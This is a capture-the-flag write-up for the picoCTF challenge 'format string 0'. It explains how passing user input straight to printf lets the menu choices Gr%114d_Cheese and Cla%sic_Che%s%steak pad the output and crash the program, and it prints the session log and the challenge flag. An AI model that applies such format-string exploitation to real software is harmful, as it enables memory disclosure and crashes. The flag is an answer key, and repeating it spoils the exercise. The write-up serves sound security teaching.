# format string 0

Can you use your knowledge of format strings to make the customers happy? Download the binary [here](https://artifacts.picoctf.net/c_mimas/68/format-string-0). Download the source [here](https://artifacts.picoctf.net/c_mimas/68/format-string-0.c).

Additional details will be available after launching your challenge instance.

-----

_The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system._ (ref: [Exploiting Format Strings](https://medium.com/@abhishekchaudhary_28536/exploiting-format-strings-849bba2c5b3))

From the binary, `format-string-0`, it presents us with three options: `Breakf@st_Burger`, `Gr%114d_Cheese` and `Bac0n_D3luxe`. Given the name of the challenge, we will select the choice with a [format string](https://www.geeksforgeeks.org/format-specifiers-in-c/) in it - `Gr%114d_Cheese`.

```c
int count = printf(choice1);
if (count > 2 * BUFSIZE) {
	serve_bob();
} else {
	printf("%s\n%s\n",
			"Patrick is still hungry!",
			"Try to serve him something of larger size!");
	fflush(stdout);
}
```

The `serve_bob()` function only executes if the printed characters exceeds 64 bytes (`BUFSIZE` is 32 bytes). At first glance, none of the options are appropriate but the `%114d` in  `Gr%114d_Cheese` is a format specifier which prints a number with a 114-character width, thus increasing the output and satisfying the condition.

We are then given a second prompt with different options: `Pe%to_Portobello`, `$outhwest_Burger`, and `Cla%sic_Che%s%steak`. The final option contains several `%s` symbols which is used by `printf` for specific data types. In this instance, `%steak` is not valid but will still process it causing a crash and the flag to print:

```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

